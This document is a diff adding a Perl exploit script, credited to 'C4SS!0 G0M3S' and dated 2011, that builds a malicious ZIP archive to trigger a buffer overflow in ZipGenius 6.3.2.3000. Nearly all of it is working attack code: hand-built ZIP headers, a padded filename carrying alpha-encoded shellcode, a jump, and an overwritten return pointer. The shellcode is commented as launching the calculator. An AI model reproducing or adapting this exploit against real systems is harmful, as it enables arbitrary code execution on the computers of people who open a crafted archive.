@@ -1,0 +1,66 @@
+#!/usr/bin/perl
+#
+#[+]Exploit Title: ZipGenius v6.3.2.3000 .ZIP File Buffer Overflow Exploit
+#[+]Date: 08\07\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://www.freewarefiles.com/ZipGenius-V_program_3344.html
+#[+]Version: 6.3.2.3000
+#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
+#[+]CVE: N/A
+#
+#
+
+use strict;
+use warnings;
+
+my $filename = "Exploit.zip"; 
+
+print "\n\n\t\tZipGenius v6.3.2.3000 .ZIP File Buffer Overflow Exploit\n";
+print "\t\tCreated by C4SS!0 G0M3S\n";
+print "\t\tE-mail Louredo_\@hotmail.com\n";
+print "\t\tSite www.exploit-br.org/\n\n";
+sleep(2);
+
+my $head = "\x50\x4B\x03\x04\x14\x00\x00".
+"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
+"\x00\x00\x00\x00\x00\x00\x00\x00" .
+"\xe4\x0f" .
+"\x00\x00\x00";
+
+my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
+"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\xe4\x0f".
+"\x00\x00\x00\x00\x00\x00\x01\x00".
+"\x24\x00\x00\x00\x00\x00\x00\x00";
+
+my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
+"\x00\x01\x00\x01\x00".
+"\x12\x10\x00\x00".
+"\x02\x10\x00\x00".
+"\x00\x00";
+
+my $shellcode = 
+"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIOJDKJTSICL9MYQ8YRTQ4L".
+"41K6IXI81WBLCZKKL6QQC4NUSV8KJMKLIY2JJN5RRQJJKMUKKOO9JZ7Z884POWXJJLXSS8CON5XJW912".
+"6WONPTLG14NQQOQPMYLMQOSFQUN9FUSTKXQFKQUPL4OIS4W5U1T3FLHQ2EHPKOYKTDWZSHQMQM7MPBKL".#SHELLCODE WinExec("CALC",0);
+"KVW7HKWHCNOP2NOKCHNMGNSO8LYMLS0OJTXRUPYQSFKNYFVBZK47DQVNZFBNGWMNPPQPZQV337XMPXCL".
+"VLJ0C3C3CVKMWKRL0GWBLSP1NVKBSOUN4V7L8G8WKYNOJ2NMOOKTYTNLFE1XOFOHXHMNPZ5LRKOOUNLK".
+"HLUVXGLMWHP7KWNMXSB644O4CEMVCLPO6QJ9KYJPKXJD4LCTYPOTYVTJTLSQ4OGKMRK8SI7D7BNMO2OB".
+"K4BX0S5LKNQX14OM8646B9CZOA";
+
+my $payload = $shellcode;
+$payload .= "A" x (1060-length($shellcode));
+$payload .= "\xeb\x0b\x90\x90";
+$payload .= pack('V',0x0283119C);
+$payload .= "\x45" x 10;
+$payload .= ("\x61" x 13)."\x58\x50\xc3"; #POP EAX / PUSH EAX / RETN
+
+$payload .= "\x41" x (4064-length($payload));
+$payload = $payload.".txt";
+my $zip = $head.$payload.$head2.$payload.$head3;
+open(FILE,">$filename") || die "[-]Error:\n$!\n";
+print FILE $zip;
+close(FILE);
+print "[+] ZIP File Created With Sucess:)\n";
+sleep(1);
